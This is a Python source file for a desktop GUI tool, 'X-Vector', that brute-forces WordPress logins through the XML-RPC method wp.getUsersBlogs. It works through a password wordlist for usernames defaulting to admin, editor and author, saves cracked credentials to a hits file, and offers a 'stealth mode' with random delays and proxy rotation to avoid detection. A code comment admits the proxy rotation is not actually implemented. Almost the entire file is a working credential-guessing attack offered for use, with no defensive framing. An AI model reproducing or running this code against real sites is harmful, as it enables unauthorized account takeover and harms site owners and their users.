import os
import json
import time
import random
import threading
import xmlrpc.client
import itertools

import customtkinter as ctk
from tkinter import filedialog, messagebox
import tkinter as tk
from datetime import datetime

# === Setup ===
LOG_FILE_PATH = "xvector_log.txt"
SESSION_FILE = "session.json"
HITS_FILE = "hits.txt"
ABORT_FLAG = threading.Event()

# Globals
start_time = None
attempt_counter = 0

# === Helper Functions ===
def safe_log(message, level="info"):
    """Thread-safe logging to GUI and to file."""
    colors = {"info": "white", "success": "green", "error": "red", "warning": "orange"}
    color = colors.get(level, "white")
    def update_log():
        log_box.configure(state="normal")
        log_box.insert("end", f"{message}\n", color)
        log_box.see("end")
        log_box.configure(state="disabled")
    log_box.after(0, update_log)
    try:
        with open(LOG_FILE_PATH, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} [{level.upper()}] {message}\n")
    except Exception as e:
        print(f"Logging error: {e}")

def browse_file(entry_widget, file_types):
    path = filedialog.askopenfilename(filetypes=file_types)
    if path:
        entry_widget.delete(0, "end")
        entry_widget.insert(0, path)

def browse_wordlist():
    browse_file(wordlist_entry, [("Text files", "*.txt")])

def browse_proxylist():
    browse_file(proxy_entry, [("Text files", "*.txt")])

def update_speed():
    while not ABORT_FLAG.is_set():
        elapsed = (time.time() - start_time) if start_time else 1
        speed = attempt_counter / elapsed if elapsed else 0.0
        speed_label.configure(text=f"Speed: {speed:.2f} req/sec")
        time.sleep(1)

def abort_attack():
    ABORT_FLAG.set()
    safe_log("[!] Brute force aborted by user.", "warning")

def validate_inputs(target, usernames, wordlist_path, min_delay, max_delay):
    if not target or not usernames or not wordlist_path:
        messagebox.showerror("Input Error", "Please fill in all required fields.")
        return False
    if not target.startswith("http"):
        messagebox.showerror("Input Error", "Target URL must start with http or https.")
        return False
    if not os.path.isfile(wordlist_path):
        messagebox.showerror("File Error", "Password wordlist file not found.")
        return False
    try:
        min_delay = float(min_delay)
        max_delay = float(max_delay)
        if min_delay < 0 or max_delay < 0 or min_delay > max_delay:
            raise ValueError()
    except Exception:
        messagebox.showerror("Input Error", "Invalid delay values.")
        return False
    return True

def run_brute_force():
    global attempt_counter, start_time
    ABORT_FLAG.clear()
    attempt_counter = 0
    start_time = time.time()

    target = target_entry.get().strip()
    usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines() if u.strip()]
    wordlist_path = wordlist_entry.get().strip()
    proxylist_path = proxy_entry.get().strip()
    stealth_mode = stealth_var.get()
    min_delay = min_delay_entry.get()
    max_delay = max_delay_entry.get()

    if not validate_inputs(target, usernames, wordlist_path, min_delay, max_delay):
        return

    min_delay = float(min_delay)
    max_delay = float(max_delay)

    # Prepare wordlist
    try:
        with open(wordlist_path, 'r', encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        messagebox.showerror("File Error", f"Could not read password file:\n{e}")
        return

    # Prepare proxy list if needed
    proxies = []
    proxy_cycle = None
    if stealth_mode and proxylist_path and os.path.isfile(proxylist_path):
        try:
            with open(proxylist_path, 'r', encoding="utf-8") as pf:
                proxies = [p.strip() for p in pf if p.strip()]
            if proxies:
                proxy_cycle = itertools.cycle(proxies)
        except Exception as e:
            safe_log(f"[!] Proxy list error: {e}", "error")

    # Resume session if available
    resume_index = 0
    if os.path.exists(SESSION_FILE):
        if messagebox.askyesno("Resume Session?", "Previous session found. Resume?"):
            try:
                with open(SESSION_FILE, "r", encoding="utf-8") as sf:
                    session_data = json.load(sf)
                    resume_index = session_data.get("resume_index", 0)
                    safe_log(f"[*] Resuming session at attempt #{resume_index}", "info")
            except Exception as e:
                safe_log(f"[!] Could not resume session: {e}", "error")

    try:
        server = xmlrpc.client.ServerProxy(target)
    except Exception as e:
        safe_log(f"[!] Could not connect to target: {e}", "error")
        return

    hit_found = False
    total_attempts = len(usernames) * len(passwords)
    progress = tk.DoubleVar(value=0)

    def update_progress_bar(val):
        progress_bar.set(val)

    for idx, user in enumerate(usernames):
        if ABORT_FLAG.is_set():
            break
        safe_log(f"\n[*] Trying user: {user}", "info")
        for pwd_idx, password in enumerate(passwords):
            if ABORT_FLAG.is_set():
                safe_log("[!] Attack aborted!", "warning")
                return

            current_attempt = idx * len(passwords) + pwd_idx
            percent = (current_attempt + 1) / total_attempts * 100
            progress_bar.after(0, update_progress_bar, percent)

            if current_attempt < resume_index:
                continue  # Skip already tried

            try:
                if stealth_mode and proxies:
                    current_proxy = next(proxy_cycle)
                    safe_log(f"[*] (Stealth) Using proxy: {current_proxy}", "info")
                    # Note: Proxy transport for xmlrpc.client requires custom implementation (not implemented here).

                resp = server.wp.getUsersBlogs(user, password)
                attempt_counter += 1

                if resp:
                    hit = f"[+] SUCCESS: {user}:{password}"
                    safe_log(hit, "success")
                    with open(HITS_FILE, "a", encoding="utf-8") as hf:
                        hf.write(hit + "\n")
                    hit_found = True
                    break

            except xmlrpc.client.Fault:
                attempt_counter += 1
                pass
            except Exception as e:
                safe_log(f"[!] Error on {user}:{password} -> {e}", "error")
                break

            # Save progress
            try:
                with open(SESSION_FILE, "w", encoding="utf-8") as sf:
                    json.dump({"resume_index": current_attempt}, sf)
            except Exception as e:
                safe_log(f"[!] Session save error: {e}", "error")

            # Random delay if stealth
            if stealth_mode:
                delay = random.uniform(min_delay, max_delay)
                safe_log(f"[*] Sleeping {delay:.2f}s", "info")
                time.sleep(delay)

        if hit_found:
            break

    # Clean up session if completed
    try:
        if os.path.exists(SESSION_FILE):
            os.remove(SESSION_FILE)
    except Exception:
        pass

    progress_bar.after(0, update_progress_bar, 100)
    if hit_found:
        messagebox.showinfo("Done", "Brute-force completed! Credentials found.")
    else:
        messagebox.showinfo("Done", "Brute-force completed. No valid credentials found.")
    safe_log("\n[*] Brute-force completed.", "success")


# === GUI Setup ===
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.title("X-Vector | WP XML-RPC Brute Forcer (Pro)")
app.geometry("780x800")
app.resizable(False, False)

padding = {"pady": (5, 0)}

# === Target URL ===
ctk.CTkLabel(app, text="Target URL (e.g., https://example.com/xmlrpc.php)").pack(**padding)
target_entry = ctk.CTkEntry(app, width=700)
target_entry.pack(pady=5)

# === Usernames ===
ctk.CTkLabel(app, text="Usernames (one per line)").pack(**padding)
usernames_box = ctk.CTkTextbox(app, height=80, width=700)
usernames_box.insert("0.0", "admin\neditor\nauthor")
usernames_box.pack(pady=5)

# === Wordlist ===
ctk.CTkLabel(app, text="Password Wordlist File").pack(**padding)
wordlist_frame = ctk.CTkFrame(app)
wordlist_frame.pack()
wordlist_entry = ctk.CTkEntry(wordlist_frame, width=500)
wordlist_entry.pack(side="left", padx=5)
ctk.CTkButton(wordlist_frame, text="Browse", command=browse_wordlist).pack(side="left")

# === Proxy List ===
ctk.CTkLabel(app, text="Proxy List (Optional)").pack(**padding)
proxy_frame = ctk.CTkFrame(app)
proxy_frame.pack()
proxy_entry = ctk.CTkEntry(proxy_frame, width=500)
proxy_entry.pack(side="left", padx=5)
ctk.CTkButton(proxy_frame, text="Browse", command=browse_proxylist).pack(side="left")

# === Stealth Settings ===
stealth_var = ctk.BooleanVar()
ctk.CTkCheckBox(app, text="Enable Stealth Mode (Random Delay + Proxy Rotation)", variable=stealth_var).pack(**padding)

# Delay range
delay_frame = ctk.CTkFrame(app)
delay_frame.pack(pady=5)
ctk.CTkLabel(delay_frame, text="Min Delay (s):").pack(side="left", padx=2)
min_delay_entry = ctk.CTkEntry(delay_frame, width=60)
min_delay_entry.insert(0, "1.0")
min_delay_entry.pack(side="left", padx=2)
ctk.CTkLabel(delay_frame, text="Max Delay (s):").pack(side="left", padx=2)
max_delay_entry = ctk.CTkEntry(delay_frame, width=60)
max_delay_entry.insert(0, "3.5")
max_delay_entry.pack(side="left", padx=2)

# === Buttons ===
button_frame = ctk.CTkFrame(app)
button_frame.pack(pady=10)

ctk.CTkButton(button_frame, text="Start Brute Force", fg_color="green", hover_color="darkgreen",
              command=lambda: threading.Thread(target=run_brute_force, daemon=True).start()).pack(side="left", padx=10)

ctk.CTkButton(button_frame, text="Abort", fg_color="red", hover_color="darkred", command=abort_attack).pack(side="left", padx=10)

# === Output Log ===
ctk.CTkLabel(app, text="Output Log").pack()
log_box = ctk.CTkTextbox(app, height=250, width=700, state="disabled")
log_box.pack(pady=(0, 10))

# === Speed ===
speed_label = ctk.CTkLabel(app, text="Speed: 0.00 req/sec")
speed_label.pack()

# === Progress Bar ===
progress_bar = ctk.CTkProgressBar(app, width=700)
progress_bar.set(0)
progress_bar.pack(pady=(10, 10))

# Start speed updater
threading.Thread(target=update_speed, daemon=True).start()

app.mainloop()
